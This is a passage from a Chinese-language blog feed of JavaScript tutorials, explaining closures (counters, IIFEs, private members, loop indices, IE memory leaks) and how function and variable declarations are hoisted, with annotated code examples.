class="headerlink" title="三、局部变量的累加"></a>三、局部变量的累加</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">outer</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">10</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;             <span class="comment">//函数嵌套函数</span></span></span><br><span class="line"><span class="undefined">                x++;</span></span><br><span class="line"><span class="undefined">                alert(x);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> y = outer();              <span class="comment">//外部函数赋给变量y;</span></span></span><br><span class="line"><span class="javascript">y();                 <span class="comment">//y函数调用一次，结果为11，相当于outer()()；</span></span></span><br><span class="line"><span class="javascript">y();                <span class="comment">//y函数调用第二次，结果为12，实现了累加</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="函数声明与函数表达式"><a href="#函数声明与函数表达式" class="headerlink" title="函数声明与函数表达式"></a>函数声明与函数表达式</h2><p>在js中我们可以通过关键字<code>function</code>来声明一个函数：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">        alert(123);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">abc();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们也可以通过一个”()”来将这个声明变成一个表达式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">        alert(123);</span></span><br><span class="line"><span class="javascript">&#125;)();                   <span class="comment">//然后通过()直接调用前面的表达式即可，因此函数可以不必写名字；</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、模块化代码，减少全局变量的污染"><a href="#四、模块化代码，减少全局变量的污染" class="headerlink" title="四、模块化代码，减少全局变量的污染"></a>四、模块化代码，减少全局变量的污染</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> abc = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;      <span class="comment">//abc为外部匿名函数的返回值</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                a++;</span></span><br><span class="line"><span class="undefined">                alert(a);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="javascript">abc();    <span class="comment">//2 ；调用一次abc函数，其实是调用里面内部函数的返回值    </span></span></span><br><span class="line"><span class="javascript">abc();    <span class="comment">//3</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、私有成员的存在"><a href="#五、私有成员的存在" class="headerlink" title="五、私有成员的存在"></a>五、私有成员的存在</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> aaa = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">bbb</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                a++;</span></span><br><span class="line"><span class="undefined">                alert(a);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">ccc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                a++;</span></span><br><span class="line"><span class="undefined">                alert(a);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                b:bbb,             <span class="comment">//json结构</span></span></span><br><span class="line"><span class="undefined">                c:ccc</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="javascript">aaa.b();     <span class="comment">//2</span></span></span><br><span class="line"><span class="javascript">aaa.c()      <span class="comment">//3</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="六-使用匿名函数实现累加"><a href="#六-使用匿名函数实现累加" class="headerlink" title="六.使用匿名函数实现累加"></a>六.使用匿名函数实现累加</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//使用匿名函数实现局部变量驻留内存中，从而实现累加</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript"> <span class="function"><span class="keyword">function</span> <span class="title">box</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> age = <span class="number">100</span>;</span></span><br><span class="line"><span class="javascript">     <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;          <span class="comment">//匿名函数</span></span></span><br><span class="line"><span class="undefined">          age++;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> age;</span></span><br><span class="line"><span class="undefined">     &#125;;</span></span><br><span class="line"><span class="undefined">     </span></span><br><span class="line"><span class="undefined"> &#125; </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> b = box();</span></span><br><span class="line"><span class="undefined">alert(b());</span></span><br><span class="line"><span class="javascript">alert(b());    <span class="comment">//即alert(box()())；</span></span></span><br><span class="line"><span class="undefined">alert(b());</span></span><br><span class="line"><span class="javascript">alert(b);            <span class="comment">//     function () &#123;</span></span></span><br><span class="line"><span class="javascript">                        <span class="comment">//   age++;</span></span></span><br><span class="line"><span class="javascript">                       <span class="comment">// return age;</span></span></span><br><span class="line"><span class="javascript">                      <span class="comment">//       &#125;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">b = <span class="literal">null</span>；  <span class="comment">//解除引用，等待垃圾回收</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>过度使用闭包会导致性能的下降。函数里放匿名函数，则产生了闭包</p><h2 id="七、在循环中直接找到对应元素的索引"><a href="#七、在循环中直接找到对应元素的索引" class="headerlink" title="七、在循环中直接找到对应元素的索引"></a>七、在循环中直接找到对应元素的索引</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=UTF-8"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> aLi = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;aLi.length;i++)&#123;</span></span><br><span class="line"><span class="javascript">                    aLi[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;        <span class="comment">//当点击时for循环已经结束</span></span></span><br><span class="line"><span class="undefined">                    alert(i);</span></span><br><span class="line"><span class="undefined">                    &#125;;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>123<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>456<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>789<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>010<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="八、使用闭包改写上面代码"><a href="#八、使用闭包改写上面代码" class="headerlink" title="八、使用闭包改写上面代码"></a>八、使用闭包改写上面代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aLi = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;aLi.length;i++)&#123;</span></span><br><span class="line"><span class="javascript">                (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        aLi[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                                alert(i);</span></span><br><span class="line"><span class="undefined">                        &#125;;</span></span><br><span class="line"><span class="undefined">                &#125;)(i);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>123<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>456<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>789<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="九-内存泄露问题"><a href="#九-内存泄露问题" class="headerlink" title="九.内存泄露问题"></a>九.内存泄露问题</h2><p>由于<code>IE</code>的<code>js</code>对象和<code>DOM</code>对象使用不同的垃圾收集方法，因此闭包在<code>IE</code>中会导致内存泄露问题，也就是无法销毁驻留在内存中的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'oDiv'</span>);<span class="comment">//oDiv用完之后一直驻留在内存中</span></span><br><span class="line">    oDiv.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'oDiv.innerHTML'</span>);<span class="comment">//这里用oDiv导致内存泄露</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">closure();</span><br><span class="line"><span class="comment">//最后应将oDiv解除引用来避免内存泄露</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'oDiv'</span>);</span><br><span class="line">    <span class="keyword">var</span> test = oDiv.innerHTML;</span><br><span class="line">    oDiv.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(test);</span><br><span class="line">    &#125;;</span><br><span class="line">    oDiv = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数与变量的解析顺序</title>
      <link href="2018/08/08/%E6%95%B4%E7%90%86-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F/"/>
      <url>2018/08/08/%E6%95%B4%E7%90%86-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="首先了解一下规则"><a href="#首先了解一下规则" class="headerlink" title="首先了解一下规则"></a>首先了解一下规则</h2><p>1)函数声明会置顶 </p><p>2)变量声明也会置顶 </p><p>3)函数声明更优先 </p><p>4)变量和赋值语句一起书写，在js引擎解析时，会将其拆成声明和赋值2部分，声明置顶，赋值保留在原来位置 </p><p>5)声明过的变量不会重复声明 </p><h3 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h3><p>先来看一下结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scope = gloabl;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(scope);  </span><br><span class="line">    <span class="keyword">var</span> scope = <span class="string">"local"</span>;  </span><br><span class="line">    <span class="built_in">console</span>.log(scope);  </span><br><span class="line">&#125;<span class="comment">//输出undefined，local</span></span><br></pre></td></tr></table></figure><p>按照规则改写顺序之后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scope = gloabl;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> scope;            <span class="comment">//声明提前</span></span><br><span class="line">    <span class="built_in">console</span>.log(scope);   <span class="comment">//输出undefined，不是gloabl</span></span><br><span class="line">    scope = <span class="string">"local"</span>       <span class="comment">//初始化</span></span><br><span class="line">    <span class="built_in">console</span>.log(scope);  <span class="comment">//输出local</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h3><p>先来看一下结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );         </span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">'fn'</span> );  </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a );         <span class="comment">//输出函数体，[]</span></span><br></pre></td></tr></table></figure><p>按照规则改写顺序之后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;            <span class="comment">//函数声明提前</span></span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">'fn'</span> ); <span class="comment">//不执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a;                   <span class="comment">//变量声明提前，但是在函数后面</span></span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="built_in">console</span>.log( a );        <span class="comment">//原本js内存地址中本来已经声明了一个名为a的函数对象                            （相当于已经将a这个地址指向了函数对象），再次声明一次                           a，但并没赋值，所以打印出来的依旧是函数a。</span></span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line">a = [];</span><br><span class="line"><span class="built_in">console</span>.log( a );        <span class="comment">//输出[]</span></span><br></pre></td></tr></table></figure><h3 id="例子三"><a href="#例子三" class="headerlink" title="例子三"></a>例子三</h3><p>先来看一下结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    a = <span class="number">10</span>;              <span class="comment">//这里a并没有提升为全局变量</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">b();</span><br><span class="line"><span class="built_in">console</span>.log(a);          <span class="comment">//输出1</span></span><br></pre></td></tr></table></figure><p>如果你不懂，我们来看看改写之后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;       <span class="comment">//函数声明置顶</span></span><br><span class="line">        <span class="built_in">console</span>.log(a); <span class="comment">//不执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="number">10</span>;             <span class="comment">//10赋值给了函数名为a的这个函数对象！</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">a  = <span class="number">1</span>;</span><br><span class="line">b();</span><br><span class="line"><span class="built_in">console</span>.log(a);        <span class="comment">//输出1</span></span><br></pre></td></tr></table></figure><p>如果把函数a注释掉</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line">b();</span><br><span class="line"><span class="built_in">console</span>.log(a);       <span class="comment">//输出10</span></span><br></pre></td></tr></table></figure><h3 id="例子四"><a href="#例子四" class="headerlink" title="例子四"></a>例子四</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );    </span><br><span class="line">a();                 </span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );    </span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">'fn'</span> );</span><br><span class="line">&#125;</span><br><span class="line">a();                 </span><br><span class="line"><span class="built_in">console</span>.log( a );    <span class="comment">//输出函数体，"fn"，1，报错</span></span><br></pre></td></tr></table></figure><p>改写顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">'fn'</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="built_in">console</span>.log( a );    <span class="comment">//输出函数体</span></span><br><span class="line">a();                 <span class="comment">//输出"fn"</span></span><br><span class="line">a = <span class="number">1</span>;               <span class="comment">//输出1</span></span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">a = &#123;&#125;;</span><br><span class="line">a();                 <span class="comment">//报错</span></span><br><span class="line"><span class="built_in">console</span>.log( a );    <span class="comment">//前面报错了，不执行了</span></span><br></pre></td></tr></table></figure><h3 id="例子五"><a href="#例子五" class="headerlink" title="例子五"></a>例子五</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn()();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( a );</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( a );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;                      <span class="comment">//输出undefined,3</span></span><br></pre></td></tr></table></figure><p>改写顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( a );</span><br><span 